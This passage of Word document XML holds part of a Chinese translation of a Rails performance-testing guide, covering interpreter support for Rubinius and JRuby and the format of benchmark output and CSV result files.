                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7967E3A0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="6BC15132" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="57C969E1" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Rubinius </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="64EFD213" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F5B0DF9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4333F8F3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3BE266E8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7792A9F2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="508E96AF" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09379577" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="346D9A32" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004F7237" w14:paraId="5ECC715A" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7254CD9E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">JRuby </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3A611A50" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">yes </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3A3B48E7" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0F689798" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3A8C553F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34AF201D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D6FC44A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03CA16DD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7ADBD6CD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">no </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="642585B3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>要在JRuby下面运行这个测试你可能需要在运行测试前运行 +export JRUBY_OPTS=“-Xlaunch.inproc=false —profile.api” .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E871579" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.5 输出</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F4F7694" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">性能测试会根据你的模式在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>tmp/performance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 文件夹里面输出几个不同的测试结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="568511BD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.5.1 基准测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0650CF" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>在基准模式中，性能测试会产生两种输出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F56E42C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.5.1.1 </w:t>
      </w:r>
      <w:r>
        <w:t>命令行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737C570E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这是一个基准测试所产生输出示例：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="14BE6418" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0424A3A8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BrowsingTest#test_homepage (31 ms warmup)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CA72958" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>           wall_time: 6 ms</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03E9C91F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>              memory: 437.27 KB</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AD56DEC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>             objects: 5,514</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28E6D166" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>             gc_runs: 0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39FC07A7" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>             gc_time: 19 ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="671298B3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.5.1.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSV</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F78FCC5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">性能测试的输出结果同样可以输出到 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>tmp/performance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 下面的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.csv</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 文件。举例来说，运行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>BrowsingTest#test_homepage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 将会生成以下5个文件：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F85E110" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="104"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>BrowsingTest#test_homepage_gc_runs.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E18184C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="104"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>BrowsingTest#test_homepage_gc_time.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D69149D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="104"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>BrowsingTest#test_homepage_memory.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4348D8BA" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="104"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>BrowsingTest#test_homepage_objects.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAF1DA0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="104"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>BrowsingTest#test_homepage_wall_time.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45107CF5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>在每次进行基准模式下的性能测试之后，结果都会附加到这几个文件下面，你可以从文件中的时间间隔里来搜集你所需要的信息。分析这些数据会对你的代码性能有很大帮助。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="3D55110B" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2496AA2F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>measurement,created_at,app,rails,ruby,platform</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="430B851F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.00738224999999992,2009-01-08T03:40:29Z,,3.0.0,ruby-1.8.7.249,x86_64-linux</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BFECB02" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.00755874999999984,2009-01-08T03:46:18Z,,3.0.0,ruby-1.8.7.249,x86_64-linux</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68BECFE9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.00762099999999993,2009-01-08T03:49:25Z,,3.0.0,ruby-1.8.7.249,x86_64-linux</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B3B02B8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.00603075000000008,2009-01-08T04:03:29Z,,3.0.0,ruby-1.8.7.249,x86_64-linux</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21E44E52" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.00619899999999995,2009-01-08T04:03:53Z,,3.0.0,ruby-1.8.7.249,x86_64-linux</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E9D74D5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.00755449999999991,2009-01-08T04:04:55Z,,3.0.0,ruby-1.8.7.249,x86_64-linux</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0997EF71" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.00595999999999997,2009-01-08T04:05:06Z,,3.0.0,ruby-1.8.7.249,x86_64-linux</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24C97049" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.00740450000000004,2009-01-09T03:54:47Z,,3.0.0,ruby-1.8.7.249,x86_64-linux</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EE556C4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.00603150000000008,2009-01-09T03:54:57Z,,3.0.0,ruby-1.8.7.249,x86_64-linux</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F3E8A87" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.00771250000000012,2009-01-09T15:46:03Z,,3.0.0,ruby-1.8.7.249,x86_64-linux</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="037BAF16" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.5.2 分析模式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF89B89" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>在分析模式里，性能测试可以生成多种输出文档。除了命令行输出以外，其他的都会根据你的解释器的不同而改变。下面是不同的输出文档类型，介绍和它支持的解释器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E73A79D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.5.2.1 </w:t>
      </w:r>
      <w:r>
        <w:t>命令行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F231DC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这是一个简单的分析测试的命令行输出：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
